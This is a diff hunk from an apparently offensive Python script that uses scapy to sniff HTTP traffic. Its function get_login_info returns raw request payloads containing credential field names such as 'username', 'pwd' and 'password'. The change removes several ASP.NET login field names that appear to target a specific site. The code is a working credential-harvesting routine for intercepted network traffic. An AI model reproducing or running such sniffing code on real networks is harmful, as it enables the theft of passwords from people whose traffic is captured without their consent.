@@ -15,7 +15,7 @@ def get_login_info(packet):
     if packet.haslayer(http.HTTPRequest):
         if packet.haslayer(scapy.Raw):
             load = packet[scapy.Raw].load
-            keybword = ["usr", "uname", "username", "pwd", "pass", "password", "ctl00$CPHContainer$txtPassword", "ctl00$CPHContainer$txtUserLogin", "ctl00_CPHContainer_txtUserLogin", "ctl00_CPHContainer_txtPassword", "ctl00%24CPHContainer%24txtPassword", "ctl00%24CPHContainer%24txtUserLogin"]
+            keybword = ["usr", "uname", "username", "pwd", "pass", "password"]
             for eachword in keybword:
                 if eachword.encode() in load:
                     return load
